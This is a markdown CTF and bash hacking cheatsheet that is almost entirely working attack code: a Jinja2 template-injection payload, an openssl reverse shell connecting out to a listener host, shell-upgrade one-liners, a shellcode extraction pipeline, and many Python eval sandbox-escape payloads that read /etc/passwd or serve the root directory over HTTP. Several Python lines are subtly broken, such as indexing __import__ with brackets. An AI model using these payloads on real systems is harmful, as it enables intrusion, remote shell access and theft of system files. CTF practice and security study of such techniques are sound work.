# Bash And CTF Cheatsheet

## Server Side Template Injection
```bash
{{ ().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('cat flag.txt') }}
```


## Bash Hack

### Bashfuck
Executing command without using alphanum characters

[BasFuck](https://github.com/trichimtrich/bashfuck)

### Socat

```bash
socat -d -d -d TCP4-LISTEN:1337,reuseaddr,fork EXEC:"python pwn.py" > /dev/null 2>&1 &
```

### Shellcode Extractor

```bash
objdump -d ./orww|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
Source : [http://www.ilmuhacking.com/exploit/belajar-membuat-shellcode-part-1/](http://www.ilmuhacking.com/exploit/belajar-membuat-shellcode-part-1/) 

### Reverse SSL shell openssl - @ThemsonMester

Before the listener can be started, a key pair and a certificate must be generated.

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

#### Listener
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
```

#### Shell
```bash
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HOST>:<PORT> > /tmp/s; rm /tmp/s
```
Source : [https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c](https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c)

### Spawn("/bin/bash") if no python installed

No python installed for the 'pty.spawn("/bin/bash")' trick? Can use expect or script as well :D

#### Script
```bash
SHELL=/bin/bash script -q /dev/null
```

#### expect
```bash
expect -c 'spawn bash; interact'
```
Source : [https://twitter.com/ropnop/status/884928178048860160](https://twitter.com/ropnop/status/884928178048860160)


### awk
```bash
awk 'BEGIN {system("/bin/bash")}'
```

## Python eval payload

```python
print('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')
exit()
sum(xrange(-999999999,99999999))
 
file('/etc/passwd').read()
open('/etc/passwd').read()
__import__['fileinput'].input('/etc/passwd')
__import__['os'].system('cat /etc/passwd')
__import__['os'].popen('/etc/passwd', 'r').read()
__import__['os'].system('cd /; python -m SimpleHTTPServer')
 
print(file('/etc/passwd').read())
print(open('/etc/passwd').read())
print(__import__['fileinput'].input('/etc/passwd'))
print(__import__['os'].system('cat /etc/passwd'))
print(__import__['os'].popen('/etc/passwd', 'r').read())
print(__import__['os'].system('cd /; python -m SimpleHTTPServer'))
 
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['exit']()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['sum']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['xrange'](-999999999,99999999))
 
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd')
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd')
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer')
 
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read())
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read())
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd'))
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd'))
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read())
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer'))
```
source : [https://www.floyd.ch/?p=584](https://www.floyd.ch/?p=584) 

